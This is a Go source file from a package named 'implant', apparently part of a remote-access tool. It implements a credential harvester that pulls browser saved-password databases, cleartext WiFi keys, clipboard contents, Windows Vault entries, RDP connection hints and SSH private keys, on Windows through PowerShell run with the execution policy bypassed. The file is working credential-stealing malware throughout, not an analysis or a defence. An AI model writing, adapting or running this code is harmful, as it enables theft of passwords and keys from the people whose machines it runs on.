package implant

import (
	"bytes"
	"context"
	"fmt"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// executePowerShell runs a PowerShell script directly (bypassing cmd.exe)
// to avoid quote escaping issues with complex PowerShell commands.
func executePowerShell(script string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	output := stdout.Bytes()
	if stderr.Len() > 0 {
		if len(output) > 0 {
			output = append(output, '\n')
		}
		output = append(output, stderr.Bytes()...)
	}
	if err != nil && len(output) == 0 {
		return []byte(err.Error()), err
	}
	return output, nil
}

// CredentialHarvester collects credentials from various sources.

// HarvestCredentials runs all credential harvesting modules.
func HarvestCredentials(target string) ([]byte, error) {
	switch target {
	case "browser", "browsers":
		return harvestBrowserCreds()
	case "wifi":
		return harvestWifiPasswords()
	case "clipboard":
		return harvestClipboard()
	case "vault":
		return harvestWindowsVault()
	case "rdp":
		return harvestRDPCreds()
	case "ssh":
		return harvestSSHKeys()
	case "keychain":
		if runtime.GOOS != "darwin" {
			return []byte("Keychain: macOS-only feature"), nil
		}
		return HarvestCredsDarwin(nil)
	case "all":
		if runtime.GOOS == "darwin" {
			return HarvestCredsDarwin(nil)
		}
		return harvestAll()
	default:
		var sb strings.Builder
		sb.WriteString("Credential Harvesting Modules:\n")
		sb.WriteString("  creds browser     Chrome/Firefox/Edge saved passwords\n")
		sb.WriteString("  creds wifi        Saved WiFi passwords\n")
		sb.WriteString("  creds clipboard   Current clipboard contents\n")
		sb.WriteString("  creds vault       Windows Credential Vault\n")
		sb.WriteString("  creds rdp         Saved RDP credentials\n")
		sb.WriteString("  creds ssh         SSH private keys\n")
		sb.WriteString("  creds keychain    macOS Keychain passwords (macOS only)\n")
		sb.WriteString("  creds all         Run all modules\n")
		return []byte(sb.String()), nil
	}
}

func harvestAll() ([]byte, error) {
	var results []string

	modules := []struct {
		name string
		fn   func() ([]byte, error)
	}{
		{"Browser Credentials", harvestBrowserCreds},
		{"WiFi Passwords", harvestWifiPasswords},
		{"Clipboard", harvestClipboard},
		{"SSH Keys", harvestSSHKeys},
	}

	if runtime.GOOS == "windows" {
		modules = append(modules,
			struct {
				name string
				fn   func() ([]byte, error)
			}{"Windows Vault", harvestWindowsVault},
			struct {
				name string
				fn   func() ([]byte, error)
			}{"RDP Credentials", harvestRDPCreds},
		)
	}

	for _, mod := range modules {
		results = append(results, fmt.Sprintf("═══ %s ═══", mod.name))
		output, err := mod.fn()
		if err != nil {
			results = append(results, fmt.Sprintf("  Error: %v", err))
		} else {
			results = append(results, string(output))
		}
		results = append(results, "")
	}

	return []byte(strings.Join(results, "\n")), nil
}

func harvestBrowserCreds() ([]byte, error) {
	if runtime.GOOS == "windows" {
		return executePowerShell(`$paths = @(@{N='Chrome';P=$env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\Login Data'},@{N='Edge';P=$env:LOCALAPPDATA+'\Microsoft\Edge\User Data\Default\Login Data'}); foreach($b in $paths){ if(Test-Path $b.P){ '['+$b.N+'] Found: '+$b.P; $t=$env:TEMP+'\ld_copy'; Copy-Item $b.P $t -Force 2>$null; '  Copied to: '+$t } else { '['+$b.N+'] Not found' } }`)
	}

	// Linux
	cmd := `echo "=== Chrome ===" && \
find ~/.config/google-chrome -name "Login Data" 2>/dev/null && \
echo "=== Firefox ===" && \
find ~/.mozilla/firefox -name "logins.json" 2>/dev/null && \
for f in $(find ~/.mozilla/firefox -name "logins.json" 2>/dev/null); do echo "--- $f ---"; cat "$f" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -30; done`
	return ExecuteShell([]string{cmd})
}

func harvestWifiPasswords() ([]byte, error) {
	if runtime.GOOS == "windows" {
		return executePowerShell(`$profiles = netsh wlan show profiles 2>$null; if ($profiles) { $profiles | ForEach-Object { if ($_ -match ':\s+(.+)$') { $p = $Matches[1].Trim(); $detail = netsh wlan show profile name="$p" key=clear 2>$null; $key = ($detail | Where-Object { $_ -match 'Key Content' }) -replace '.*:\s+',''; if ($key) { "$p : $key" } else { "$p : (no password)" } } } } else { 'No WiFi profiles found' }`)
	}
	return ExecuteShell([]string{`grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null | sed 's/.*psk=//' || echo "No WiFi passwords found (need root)"`})
}

func harvestClipboard() ([]byte, error) {
	if runtime.GOOS == "windows" {
		return executePowerShell("Get-Clipboard")
	}
	return ExecuteShell([]string{`xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || echo "Clipboard tools not available"`})
}

func harvestWindowsVault() ([]byte, error) {
	if runtime.GOOS != "windows" {
		return []byte("Windows Vault: Windows-only feature"), nil
	}
	return ExecuteShell([]string{"cmdkey", "/list"})
}

func harvestRDPCreds() ([]byte, error) {
	if runtime.GOOS != "windows" {
		return []byte("RDP credentials: Windows-only feature"), nil
	}
	return executePowerShell(`$servers = Get-ChildItem 'HKCU:\Software\Microsoft\Terminal Server Client\Servers' -EA SilentlyContinue; if ($servers) { foreach ($s in $servers) { $s.PSChildName + ' : ' + $s.GetValue('UsernameHint') } } else { 'No saved RDP credentials found' }`)
}

func harvestSSHKeys() ([]byte, error) {
	if runtime.GOOS == "windows" {
		return executePowerShell(`Get-ChildItem "$env:USERPROFILE\.ssh" -EA SilentlyContinue | ForEach-Object { '--- ' + $_.Name + ' ---'; Get-Content $_.FullName -EA SilentlyContinue | Select-Object -First 5 }`)
	}
	return ExecuteShell([]string{`echo "=== SSH Keys ===" && ls -la ~/.ssh/ 2>/dev/null && echo "" && for f in ~/.ssh/id_*; do echo "--- $f ---"; head -2 "$f" 2>/dev/null; echo "..."; done`})
}
